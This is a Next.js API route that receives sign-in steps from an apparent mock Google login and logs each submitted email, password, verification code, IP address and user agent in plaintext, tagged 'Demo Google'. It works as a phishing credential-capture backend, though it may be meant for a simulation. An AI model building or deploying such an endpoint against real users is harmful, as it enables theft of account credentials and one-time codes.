import { NextRequest, NextResponse } from 'next/server';

export async function POST(req: NextRequest) {
  let payload: any = {};

  try {
    payload = await req.json();
  } catch {
    payload = {};
  }

  const ip = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || null;
  const entry = {
    step: payload?.step,
    email: payload?.email,
    code: payload?.code,
    password: payload?.password,
    passwordProvided: payload?.passwordProvided,
    ip,
    userAgent: req.headers.get('user-agent'),
    timestamp: new Date().toISOString(),
  };

  console.log(`[Demo Google] ${JSON.stringify(entry)}`);

  return NextResponse.json({ ok: true });
}
